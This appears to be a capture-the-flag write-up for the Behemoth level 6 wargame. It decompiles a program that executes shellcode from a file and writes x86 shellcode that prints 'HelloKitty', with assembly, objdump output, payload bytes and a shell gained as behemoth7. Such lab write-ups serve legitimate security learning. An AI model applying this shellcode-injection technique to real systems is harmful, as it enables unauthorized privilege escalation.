@@ -1,0 +1,164 @@
+Interesting level! Requires writing some basic shellcode.
+
+Unlike the other levels, behemoth 6 has two executable files - behemoth6 and behemoth6_reader
+
+Checking the control flow graph for behemoth6, it seems that it:
+ - opens behemoth6 reader using popen and stores the output from that program
+ - more crucially, checks that the output is actually equal to "HelloKitty"
+
+If the output was correct, it executes a shell with behemoth 7 permissions.
+
+So what does behemoth6_reader do?
+
+
+						   decompiled main (behemoth6_reader):
+		 _______________________________________________________________________________________
+		| int main(void)									|
+		|{											|
+		|    File *fp;										|
+		|    fp = fopen("shellcode.txt", 'r');							|
+		|    if (fp == 0) {									|
+		|        puts("Couldn't open shellcode.txt!");						|
+		|    } else {										|
+		|        seek(fp, 0, 2);								|
+		|        ptr = (void *) ftell(fp);							|
+		|        rewind(fp);									|
+		|        userFunc = (void *)malloc(ptr);						|
+		|        fread(userFunc, ptr, 1, fp);							|
+		|        fclose(fp);									|
+		|	//For loop reading in and checking bytes... not sure what the '\v' part is for	|
+		|        puVar2 = auStack48;								|
+		|        for (stream = 0; stream < (int32_t)ptr; stream = stream + 1) {			|
+		|            puVar1 = puVar2;								|
+		|            if (*(char *)((int32_t)userFunc + stream) == '\v') {			|
+		|                puVar1 = puVar2 + -0x10;						|
+		|                *(char **)(puVar2 + -0x10) = "Write your own shellcode.";		|
+		|                *(undefined4 *)(puVar2 + -0x14) = 0x8048679;				|
+		|                puts();								|
+		|                *(undefined4 *)(puVar2 + -0x10) = 1;					|
+		|                *(undefined4 *)(puVar2 + -0x14) = 0x8048686;				|
+		|                exit();								|
+		|            }										|
+		|            puVar2 = puVar1;								|
+		|        }										|
+		|        pvStack36 = userFunc;								|
+		|        *(undefined4 *)(puVar2 + -4) = 0x804869d;					|
+		|	//Execute user payload								|
+		|        (*(code *)userFunc)();								|
+		|    }											|
+		|    return 0;										|
+		|}											|
+		 _______________________________________________________________________________________
+
+Although I didn't clean up the decompiled code too too much, its clear that it opens a file 'shellcode.txt' and reads it in.
+From there, it calls a function pointer to the shellcode and executes it!
+
+Since behemoth6 checks if the output of behemoth6_reader is 'HelloKitty', we just need shellcode that writes that to stdout:
+
+						   kitty.asm:
+					 _______________________________
+					| global _start			|
+					| _start:			|
+					| 	 mov ebp, esp		| <- wipe stack frame
+					|	 xor eax, eax		|
+					|	 xor ebx, ebx		|
+					|	 xor ecx, ecx		|
+					|	 xor edx, edx		| <- wipe registers for no nullbytes
+					|	 push 0x79747469 ;itty	|
+					|	 push 0x4b6f6c6c ;lloK	|
+					|	 push 0x65486464 ;..He	| <- push "ddHelloKitty" onto the stack
+					|	 lea ecx, [esp+2]	| <- load String address for "HelloKitty" into ecx (for write syscall)
+					|	 push eax 		| <- terminate string with a nullbyte (indirectly)
+					|	 mov al, 4		| <- write syscall in eax lower register
+					|	 mov bl, 1		| <- file descriptor set to stdout
+					|	 mov dl, 12		| <- length of string to write (12 for HelloKitty)
+					|	 int 0x80		| <- syscall
+					|	 xor eax, eax		|
+					|	 xor ebx, ebx		|
+					|	 xor ecx, ecx		|
+					|	 xor edx, edx		|
+					|	 mov al, 1		|
+					|	 int 0x80		| <- rest is exit syscall
+					 _______________________________
+
+We need the exit syscall, because otherwise behemoth6_reader segfaults and the output doesn't reach /behemoth/behemoth6
+
+To get the shellcode and put it in a payload, we assemble and link kitty.asm:
+________________________________________________________________________________
+λ ~/behemoth6/ nasm -f elf kitty.asm
+λ ~/behemoth6/ ld -m elf_i386 -s -o kitty kitty.o
+λ ~/behemoth6/ ./kitty
+HelloKitty
+________________________________________________________________________________
+
+It works! Now we use objdump to get the bytes:
+
+________________________________________________________________________________
+λ ~/Documents/otw/behemoth/behemoth6/ master* objdump -d ./kitty
+
+./kitty:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08049000 <.text>:
+ 8049000:       89 e5                   mov    %esp,%ebp
+ 8049002:       31 c0                   xor    %eax,%eax
+ 8049004:       31 db                   xor    %ebx,%ebx
+ 8049006:       31 c9                   xor    %ecx,%ecx
+ 8049008:       31 d2                   xor    %edx,%edx
+ 804900a:       68 69 74 74 79          push   $0x79747469
+ 804900f:       68 6c 6c 6f 4b          push   $0x4b6f6c6c
+ 8049014:       68 64 64 48 65          push   $0x65486464
+ 8049019:       8d 4c 24 02             lea    0x2(%esp),%ecx
+ 804901d:       50                      push   %eax
+ 804901e:       b0 04                   mov    $0x4,%al
+ 8049020:       b3 01                   mov    $0x1,%bl
+ 8049022:       b2 0c                   mov    $0xc,%dl
+ 8049024:       cd 80                   int    $0x80
+ 8049026:       31 c0                   xor    %eax,%eax
+ 8049028:       31 db                   xor    %ebx,%ebx
+ 804902a:       31 c9                   xor    %ecx,%ecx
+ 804902c:       31 d2                   xor    %edx,%edx
+ 804902e:       b0 01                   mov    $0x1,%al
+ 8049030:       cd 80                   int    $0x80
+________________________________________________________________________________
+
+and by hand (or with clever sed/awk usage that I'm not aware of) we build the shellcode:
+
+
+'\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x68\x69\x74\x74\x79\x68\x6c\x6c\x6f\x4b\x68\x64\x64\x48\x65
+\x8d\x4c\x24\x02\x50\xb0\x04\xb3\x01\xb2\x0c\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x01\xcd\x80'
+
+Kinda lengthy... gotta work on my shellcode writng
+
+Either way, put those bytes into a file named 'shellcode.txt' (I used python2 to do this)
+
+				payload.py
+________________________________________________________________________________________
+#!/bin/python2
+payload = b'\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x68\x69\x74\x74\x79\x68\x6c\x6c\x6f
+\x4b\x68\x64\x64\x48\x65\x8d\x4c\x24\x02\x50\xb0\x04\xb3\x01\xb2\x0c\xcd\x80\x31\xc0\x31
+\xdb\x31\xc9\x31\xd2\xb0\x01\xcd\x80'
+print(payload)
+________________________________________________________________________________________
+
+_____________________________
+./payload.py > shellcode.txt
+_____________________________
+
+
+Lastly, upload it using scp or something else to a folder in /tmp/, run /behemoth/behemoth6 from there and you get a shell!
+
+__________________________________________________
+behemoth6@behemoth:~$ cd /tmp/tald6
+behemoth6@behemoth:/tmp/tald6$ ls
+shellcode.txt
+behemoth6@behemoth:/tmp/tald6$ /behemoth/behemoth6
+Correct.
+$ whoami
+behemoth7
+$
+__________________________________________________
+
+Woo!
